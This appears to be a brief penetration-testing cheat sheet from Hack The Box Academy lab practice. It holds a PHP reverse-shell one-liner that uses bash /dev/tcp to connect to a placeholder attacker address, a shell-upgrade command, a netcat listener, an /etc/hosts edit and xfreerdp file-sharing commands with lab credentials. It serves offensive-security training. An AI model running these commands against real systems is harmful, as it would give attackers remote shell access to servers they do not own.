
PHP Reverse Shell one-liner
```
exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
```

Spawn Upgraded PTY Shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Listen on port 8080:
```
nc -nlvp 8080
```

Add to VHost:
```
echo "10.129.201.58 web01.inlanefreight.local" | sudo tee -a /etc/hosts
```

Find filename using tree: `-f` flag to print the full path prefixes so `grep` can read them.
```
tree -f | grep "your_filename"
```

### Method 1: Share a Local Drive via xfreerdp (Easiest)

You can share a local Linux folder so it appears as a network drive (`\tsclient`) inside the Windows target. [[1](https://csbygb.gitbook.io/pentips/post-exploitation/file-transfers)]
- Run this command from your Linux terminal:  
```
	xfreerdp /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!' /cert:ignore +clipboard /drive:shared,/path/to/your/linux/folder /dynamic-resolution
```

```
xfreerdp /v: /u: /p: /cert:ignore +clipboard /drive:shared,. /dynamic-resolution
```
